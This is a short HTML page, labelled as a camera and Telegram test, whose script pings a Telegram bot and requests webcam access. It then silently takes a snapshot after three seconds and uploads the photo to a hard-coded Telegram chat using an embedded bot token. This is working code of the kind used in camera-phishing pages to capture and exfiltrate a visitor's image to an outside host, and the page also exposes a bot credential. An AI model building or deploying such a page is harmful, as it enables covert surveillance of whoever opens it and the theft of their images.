<!DOCTYPE html>
<html>
<body>
  <h2>Testing Camera & Telegram</h2>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    const botToken = "8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ";
    const chatId = "7216371031";

    // Send TEST TEXT
    fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: "👋 Script started..." })
    });

    // Start camera
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");

        video.srcObject = stream;

        setTimeout(() => {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          ctx.drawImage(video, 0, 0);

          stream.getTracks().forEach(track => track.stop());

          canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append("chat_id", chatId);
            formData.append("photo", blob);
            formData.append("caption", "✅ Snapshot sent");

            fetch("https://api.telegram.org/bot" + botToken + "/sendPhoto", {
              method: "POST",
              body: formData
            }).then(() => alert("✅ Sent to Telegram!"));
          }, "image/jpeg", 0.9);
        }, 3000);
      })
      .catch(err => {
        alert("❌ Camera access failed: " + err.message);
      });
  </script>
</body>
</html>
